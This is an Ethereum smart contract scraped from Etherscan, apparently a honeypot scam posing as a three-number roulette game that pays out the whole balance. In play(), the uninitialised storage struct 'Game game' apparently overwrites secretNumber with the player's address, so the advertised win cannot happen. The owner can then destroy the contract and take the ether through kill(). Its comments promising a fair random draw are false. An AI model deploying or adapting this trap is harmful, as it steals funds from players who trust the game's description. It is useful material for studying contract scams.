//token_name	
//token_url	https://etherscan.io//address/0x13b87fB8E6152032fD525F64f158c129a230b6ee#code
//spider_time	2018/07/08 12:30:51
//token_Transactions	3 txns
//token_price	

// BigBallerRoulette: Go big or go home
// 
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.
//
// To play, call the play() method with the guessed number (1-3). Big balls edition: Bet price: 1 ether

contract BigBallerRoulette {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 1 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    function BigBallerRoulette() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        // randomly set secretNumber with a value between 1 and 3
        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 3 + 1;
    }

    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= 3);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            // win!
            msg.sender.transfer(this.balance);
        }

        shuffle();
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}